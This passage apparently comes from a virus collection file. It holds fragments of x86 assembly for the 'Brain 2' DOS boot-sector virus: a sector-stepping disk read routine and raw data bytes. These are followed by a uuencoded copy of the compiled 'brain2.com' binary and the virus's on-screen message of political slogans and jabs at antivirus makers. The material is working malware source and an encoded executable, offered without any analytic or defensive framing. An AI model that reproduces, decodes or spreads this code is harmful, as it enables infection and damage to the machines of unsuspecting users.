                POP     CX
                RETN
READ_DISK       ENDP

;Set params for next disk sector read
NXT_SECTOR      PROC NEAR
                MOV     AL,[SECTOR_NO]          ;increment sector number
                INC     AL
                MOV     [SECTOR_NO],AL
                CMP     AL,0AH                  ;is sector=10?
                JNE     NSDONE                  ;if not, all done
                MOV     [SECTOR_NO],1           ;yes, set sector=1 now
                MOV     AL,[HEAD_NO]            ;increment head count
                INC     AL
                MOV     [HEAD_NO],AL
                CMP     AL,2                    ;is it 2 yet?
                JNE     NSDONE                  ;if not, all done
                MOV     [HEAD_NO],0             ;yes, set head = 0
                INC     [CYL_NO]                ;and increment cylinder number
NSDONE:         RETN
NXT_SECTOR      ENDP

;-----------------------------------------------------

                DB      0E3H
                DB      23H,4DH,59H,0F4H,0A1H,82H
                DB      0BCH,0C3H,12H,0,7EH,12H
                DB      0CDH,21H,0A2H,3CH,5FH,0CH,5


                END     COM_START


begin 775 brain2.com
MZ?T`````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M`````````````````````````````````````````.LF*&,I(#$Y.#8@2F]R
M:R`@)B!!;6IA9',@*'!V="D@3'1D(``$```NQ@8E`A\SP([8H4P`H[0!H4X`
MH[8!N'8"HTP`C,BC3@"Y!``SP([`42Z*-@8`L@`NBPX'`+@!`KL`?,UM+BS1CJ`'P``)#[@/P"=1B`^@)W$X#]`'4%@/X`=`PN_@XE`G4"ZP/I
MI0`NQ@8G`@`NQ@8E`@104U%2+H@6)@*Y!`!1M`#-;7(5M@"Y`0"[O@8&C,B.
MP+@!`LUM!W,&6>+AZR^062ZAP@8]-!)U""[&!B<"`>L@'@:,R([8CL!6Z!4#
M<@DNQ@8G`@+HN`%>!Q]S!+0`S6U:65M8@_D!=3"`_@!U*RZ`/B<"`741+HL.
MQ08NBQ;#!BZ*%B8"ZQ(N@#XG`@)U"BZ+#@<`+HHV!@#-;<&4P,``.AF`#T``'4._P93`X,^4P,#=0GK
M$I#'!E,#``!!@?EC`77=L`'YP[(#Z!``2?[*=?A!Z)H`Z&8`L`#XPU%2OKX&
MBL'0Z'(.Z$(`BP`E`/`-]P_K#)#H-`"+`"4/``UP_XD`B8``!%I9PU&^O@:*
MP=#H<@OH%@"+`"7_#^L-D.@+`(L`)?#_L033Z%G#4K@#`/?AT>B+V%K#M`+H
M!P##M`/H`0##N00`45"T`,UM6'(4N[X&L`2V`(H6)@*Y`@!0S6U8<-9PU&#Z0+1X8/!#(O!L1+V\:((`,8&!@``_L2`_`EV"(#L"<8&!@`!
MB"8'`%G#`````````UL``P.^#@$```'@V)W7X)^-F)^.X"`H8RD@87-H87(@
M).C;`'(*5^@?`%]R`^C7`,.[FP2Y"P"*!_;8B`1&0^+VL`B(!/C#Q@;'!I$$
M;`"^_@:)%I,$H9$$T>BCEP31Z*.5!)&`X4.+/I4$@+GS1A96UG#H`I\_L"B"GP\
M"G4:Q@8*?`&@"7S^P*()?#P"=0G&!@E\`/X&"WS#XR--6?2A@KS#$@!^$LTA
%HCQ?#`4`
`
end

; ---------------------------------------------------------------------------  
Text    db      '  **  B R A I N  2  v1.40  **',0Dh,0Ah,0Dh,0Ah
        db      'WARNING ! Your PC has been WANKed !',0Dh,0Ah,0Dh,0Ah
        db      '>> 17.11.1989 <<', 0Dh,0Ah,0Dh,0Ah
        db      'Viruses against political extremes , for freedom '
        db      'and parliamentary democracy.', 0Dh,0Ah,0Dh,0Ah
        db      '>> STOP LENINISM , STOP KLAUSISM , STOP BLOODY DOGMATIC '
        db      'IDEOLOGY !! <<', 0Dh,0Ah,0Dh,0Ah,'Remarks:',0Dh,0Ah
        db      ' - for John McAfee: John,your SCAN = good program.'
        db      0Dh,0Ah,0Dh,0Ah,' - for CN and his company:', 0Dh, 0Ah
        db      '   Boys,the best ANTI-VIRUSES are Zeryk,Saryk and Vorisek !'
        db      0Dh,0Ah,0Dh,0Ah,' - for F : Girls are better than computers '
        db      'and programming !', 0Dh, 0Ah, 0Dh, 0Ah
        db      'This program is copyright by  SB SOFTWARE  '
        db      'All rights reserved.',0Dh,0Ah,0Dh,0Ah,'O.K. '
        db      'Your PC is now ready !',0Dh,0Ah,7Fh
